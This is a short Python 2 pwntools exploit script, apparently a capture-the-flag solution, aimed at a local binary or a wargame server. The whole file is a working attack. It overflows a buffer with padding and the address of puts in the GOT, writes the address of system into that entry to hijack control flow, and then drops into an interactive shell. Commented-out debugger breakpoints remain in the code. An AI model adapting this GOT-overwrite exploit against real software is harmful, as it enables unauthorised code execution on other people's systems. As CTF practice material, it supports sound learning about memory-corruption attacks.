from pwn import *
import struct
context(os='linux', arch='i386')

def getConn():
    return process('./pwnd') if local else remote('chall05-pwn02.wargame.whitehat.vn', 28104)
local = True

r = getConn()


puts_GOT=	0x804A018
system=		0x804865F

pl="A"*96+p32(puts_GOT)


#gdb.attach(r, '''
#break *0x80485F3
#break *0x804860E
#break *0x8048613
#break *0x804863F
#c
#''')

#f=open('x','w')
#f.write(pl)
#f.close()
def pwn():
	try:
		print r.recv()
		r.sendline(pl)
		print r.recvuntil("Enter your key1: ")
		r.sendline(str(int(system)))
		r.sendline("a")
		print r.recv()
	except Exception, e:
		print "Err",e
pwn()
r.interactive()
r.close()

